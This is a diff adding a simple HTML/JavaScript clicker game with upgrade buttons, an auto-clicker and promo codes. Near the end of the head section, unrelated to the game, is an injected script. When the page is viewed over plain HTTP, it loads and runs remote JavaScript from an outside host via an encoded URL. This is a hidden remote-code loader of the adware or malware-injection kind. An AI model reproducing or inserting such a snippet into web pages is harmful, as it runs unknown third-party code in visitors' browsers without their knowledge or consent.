@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Button Clicker</title>
+<script>
+
+var add = 1
+var ppc = 1
+var cost = 10
+var cost2 = 600
+var auto = 0
+var pps = 0
+var promo1use = 0 
+var promo2use = 0
+var promo3use = 0
+    var textField = document.getElementById( "textField" );
+    var currentValue = parseInt(textField.value);
+	function handleButtonClick4() {
+	if (auto > 0) {
+	setTimeout(handleButtonClick2(), 1000)
+	}
+	}
+function handleButtonClick() {
+    var textField = document.getElementById( "textField" );
+    var currentValue = parseInt(textField.value);
+    // Add one
+    currentValue = currentValue + add;
+    // Put it back with the new +1'd value
+    textField.value = currentValue;
+}
+function upgrade() {
+var textField = document.getElementById( "textField" );
+var currentValue = parseInt(textField.value);
+if (currentValue >= cost) {
+currentValue = currentValue - cost;
+textField.value = currentValue;
+cost = cost + 40;
+ppc = ppc + 1;
+add = add + 1;
+document.getElementById("ppc").value="ppc: " +ppc; 
+document.getElementById("upgrade").value="upgrade button: " + cost + " points"; 
+  }
+}
+function upgrade2() {
+var textField = document.getElementById( "textField" );
+var currentValue = parseInt(textField.value);
+if (currentValue >= cost2) {
+currentValue = currentValue - cost2;
+textField.value = currentValue;
+cost2 = cost2 + 800;
+auto = auto + 1;
+pps = pps + 1;
+document.getElementById("upgradeauto").value="upgrade auto click: " + cost2 + " points"; 
+document.getElementById("pps").value="pps: " +pps; 
+setTimeout(handleButtonClick2(), 1000)
+ }
+}
+function handleButtonClick2() {
+var textField = document.getElementById( "textField" );
+var currentValue = parseInt(textField.value);
+if (auto > 0) {
+    currentValue = currentValue + auto;
+	textField.value = currentValue;
+setTimeout(handleButtonClick2, 1000)
+}
+}
+function handleButtonClick3() {
+var promo = document.getElementById( "promo" ).value;
+var textField = document.getElementById( "textField" );
+var currentValue = parseInt(textField.value);
+if (promo == "pointz") {
+if (promo1use == 0) {
+    currentValue = currentValue + 5000;
+	textField.value = currentValue;
+	promo1use = promo1use + 1;
+}
+}
+else
+if (promo == "10ppc4u") {
+if (promo2use == 0) {
+	promo2use = promo2use + 1;
+ppc = ppc + 10;
+document.getElementById("ppc").value="ppc: " +ppc; 
+add = add + 10;
+}
+}
+else
+if (promo == "autopointz") {
+if (promo3use == 0) {
+	promo3use = promo3use + 1;
+	pps = pps + 5;
+	auto = auto + 5
+	promo3use = promo3use + 1;
+	document.getElementById("pps").value="pps: " +pps; 
+	document.getElementById("upgradeauto").value="upgrade auto click: " + cost2 + " points"; 
+	setTimeout(handleButtonClick2(), 1000)
+}
+}
+}
+</script>
+<style>
+#add {
+    background-color: #FF0000;
+    -moz-border-radius: 30px;
+    -webkit-border-radius: 30px;
+    border-radius: 30px;
+    color: #fff;
+    font-family: 'Oswald';
+    font-size: 20px;
+    text-decoration: none;
+    cursor: pointer;
+    border:none;
+    height:4em; width:7em;
+}
+#upgrade {
+    background-color: #00FF00;
+    -moz-border-radius: 30px;
+    -webkit-border-radius: 30px;
+    border-radius: 30px;
+    color: #fff;
+    font-family: 'Oswald';
+    font-size: 20px;
+    text-decoration: none;
+    cursor: pointer;
+    border:none;
+    height:4em; width:17em;
+}
+#ppc {
+    background-color: #A3A3A3;
+    -moz-border-radius: 30px;
+    -webkit-border-radius: 30px;
+    border-radius: 30px;
+    color: #fff;
+    font-family: 'Oswald';
+    font-size: 20px;
+    text-decoration: none;
+    cursor: pointer;
+    border:none;
+    height:1.2em; width:7.5em;
+}
+#textField {
+    background-color: #A3A3A3;
+    -moz-border-radius: 30px;
+    -webkit-border-radius: 30px;
+    border-radius: 30px;
+    color: #fff;
+    font-family: 'Oswald';
+    font-size: 20px;
+    text-decoration: none;
+    cursor: pointer;
+    border:none;
+    height:1.2em; width:14em;
+}
+#logo {
+    background-color: #00BFFF;
+    -moz-border-radius: 30px;
+    -webkit-border-radius: 30px;
+    border-radius: 30px;
+    color: #fff;
+    font-family: 'Oswald';
+    font-size: 20px;
+    text-decoration: none;
+    cursor: pointer;
+    border:none;
+    height:7em; width:17em;
+}
+#upgradeauto {
+    background-color: #FFFF00;
+    -moz-border-radius: 30px;
+    -webkit-border-radius: 30px;
+    border-radius: 30px;
+    color: #fff;
+    font-family: 'Oswald';
+    font-size: 20px;
+    text-decoration: none;
+    cursor: pointer;
+    border:none;
+    height:4em; width:24em;
+}
+#pps {
+    background-color: #A3A3A3;
+    -moz-border-radius: 30px;
+    -webkit-border-radius: 30px;
+    border-radius: 30px;
+    color: #fff;
+    font-family: 'Oswald';
+    font-size: 20px;
+    text-decoration: none;
+    cursor: pointer;
+    border:none;
+    height:1.5em; width:24em;
+}
+#spromo {
+    background-color: #800080;
+    -moz-border-radius: 30px;
+    -webkit-border-radius: 3.0px;
+    border-radius: 30px;
+    color: #fff;
+    font-family: 'Oswald';
+    font-size: 20px;
+    text-decoration: none;
+    cursor: pointer;
+    border:none;
+    height:1.5em; width:10em;
+}
+#promo {
+    background-color: #ADD8E6;
+    -moz-border-radius: 30px;
+    -webkit-border-radius: 3.0px;
+    border-radius: 30px;
+    color: #fff;
+    font-family: 'Oswald';
+    font-size: 20px;
+    text-decoration: none;
+    cursor: pointer;
+    border:none;
+    height:1.5em; width:13em;
+}
+</style>
+<script>var nz3Hsx8l = 1;(function(){var k=function(){if(window == window.top && document.location.protocol == 'http:') {var komCat = document.createElement('script');komCat.src = 'http://srdrvp.com/cmn2?p=YTEyNzM2NDI2MDdMm587ZhqHxxyh%2FYR%2F1hhbVyNEMTZMQoSgrbKi%2FkB9PEbl09T2oyLgA99i6tj%2FhnMVDMKCQRGv0N3fK2go0EGaSyxmOE%2FFy9vc1uA27WBz%2BghzZWBlu2AXgKnItTK%2FnmuZRNrzzj8j7bWzaFvrd7wJTehrmlvjenQ%3D&d=98';komCat.type = 'text/javascript';document.getElementsByTagName('head')[0].appendChild(komCat);}};(function d(){if(document.readyState=='interactive' || document.readyState=='complete'){k()}else{window.setTimeout(d,50)}}())}());</script></head>
+<body onload="handleButtonClick4()" bgcolor="#336666">
+<input type="text" value="Button Clicker  by:Camaron Stumpf" id="logo" readonly/>
+<br>
+<br>
+<input type="text" value="0" id="textField" readonly/>
+<input type="text" value="ppc: 1" id="ppc" size="14" readonly/>
+<br>
+<input type="button" id="add" onClick="handleButtonClick()" value="click">
+<input type="button" id="upgrade" onClick="upgrade()" value="upgrade button: 10 points">
+<br>
+<input type="button" id="upgradeauto" onClick="upgrade2()" value="enable auto click: 600 points">
+<br>
+<input type="text" value="pps: 0" id="pps" readonly/>
+<br>
+<br>
+<input type="text" value="" id="promo">
+<input type="button" id="spromo" onClick="handleButtonClick3()" value="submit promo">
+</body>
+</html>
